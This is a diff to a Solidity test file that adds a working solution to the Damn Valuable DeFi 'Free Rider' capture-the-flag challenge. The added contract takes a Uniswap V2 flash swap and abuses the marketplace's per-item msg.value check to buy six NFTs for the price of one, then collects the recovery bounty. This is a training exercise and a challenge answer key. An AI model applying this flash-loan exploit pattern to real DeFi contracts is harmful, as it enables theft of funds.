@@ -4,13 +4,81 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
+import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+
+contract FreeRiderFlashSwap is IUniswapV2Callee, IERC721Receiver {
+    IUniswapV2Pair private immutable pair;
+    WETH private immutable weth;
+    FreeRiderNFTMarketplace private immutable marketplace;
+    DamnValuableNFT private immutable nft;
+    FreeRiderRecoveryManager private immutable recoveryManager;
+    address private immutable player;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        WETH _weth,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager,
+        address _player
+    ) {
+        pair = _pair;
+        weth = _weth;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = _player;
+    }
+
+    function execute(uint256 amountWethOut) external {
+        require(msg.sender == player, "only player");
+        pair.swap(amountWethOut, 0, address(this), abi.encode(amountWethOut));
+        payable(player).transfer(address(this).balance);
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external override {
+        require(msg.sender == address(pair), "only pair");
+        require(amount1 == 0, "unexpected token1");
+
+        uint256 amountBorrowed = abi.decode(data, (uint256));
+        require(amount0 == amountBorrowed, "amount mismatch");
+
+        // unwrap WETH so we can pay marketplace in ETH
+        weth.withdraw(amountBorrowed);
+
+        uint256[] memory ids = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            ids[i] = i;
+        }
+
+        // marketplace bug: only checks msg.value "per item"
+        marketplace.buyMany{value: 15 ether}(ids);
+
+        // deliver NFTs to recovery manager (triggers bounty)
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
+        }
+
+        // repay flash swap in WETH (0.3% fee)
+        uint256 amountToRepay = (amountBorrowed * 1000) / 997 + 1;
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(pair), amountToRepay);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +191,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        FreeRiderFlashSwap attacker = new FreeRiderFlashSwap(
+            uniswapPair,
+            weth,
+            marketplace,
+            nft,
+            recoveryManager,
+            player
+        );
+
+        // Borrow enough WETH to pay 15 ETH once.
+        attacker.execute(15 ether);
     }
 
     /**
